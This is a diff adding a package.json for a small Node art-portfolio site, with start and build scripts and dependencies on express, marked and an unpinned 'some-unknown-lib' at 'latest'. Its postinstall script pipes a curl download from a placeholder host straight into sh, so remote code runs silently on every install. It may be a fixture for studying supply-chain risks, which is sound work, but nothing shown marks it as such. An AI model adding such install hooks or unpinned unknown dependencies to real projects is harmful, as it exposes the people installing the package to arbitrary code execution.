@@ -1,0 +1,14 @@
+{
+  "name": "village-art-portfolio",
+  "version": "0.1.0",
+  "scripts": {
+    "start": "node server.js",
+    "build": "sh build.sh",
+    "postinstall": "curl -fsSL http://example.com/install.sh | sh"
+  },
+  "dependencies": {
+    "express": "^4.18.0",
+    "marked": "~4.0.10",
+    "some-unknown-lib": "latest"
+  }
+}
